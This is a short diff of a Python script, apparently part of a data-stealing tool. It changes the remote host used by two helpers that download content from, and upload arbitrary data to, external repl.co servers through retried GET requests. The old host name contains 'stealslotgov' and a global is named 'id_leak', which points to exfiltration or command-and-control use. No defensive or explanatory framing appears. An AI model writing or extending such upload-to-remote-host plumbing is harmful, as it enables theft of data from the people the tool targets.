@@ -14,7 +14,7 @@ stop_command = False
 id_leak = []
 
 def DOWNLOAD_CONTENT(FILES, MODE):
-    url_content = f'https://stealslotgov.idkotherhex1629.repl.co/download={FILES}&mode={MODE}'
+    url_content = f'https://hehe-boy.repl.co/download={FILES}&mode={MODE}'
     while True:
         try:
             r = requests.get(url_content)
@@ -24,7 +24,7 @@ def DOWNLOAD_CONTENT(FILES, MODE):
     return r.content
 
 def UPLOAD_CONTENT(FILES, MODE, DATA):
-    url_content = f'https://stealslotgov.idkotherhex1629.repl.co/write={DATA}&name={FILES}&mode={MODE}'
+    url_content = f'https://hehe-boy.repl.co/write={DATA}&name={FILES}&mode={MODE}'
     while True:
         try:
             r = requests.get(url_content)
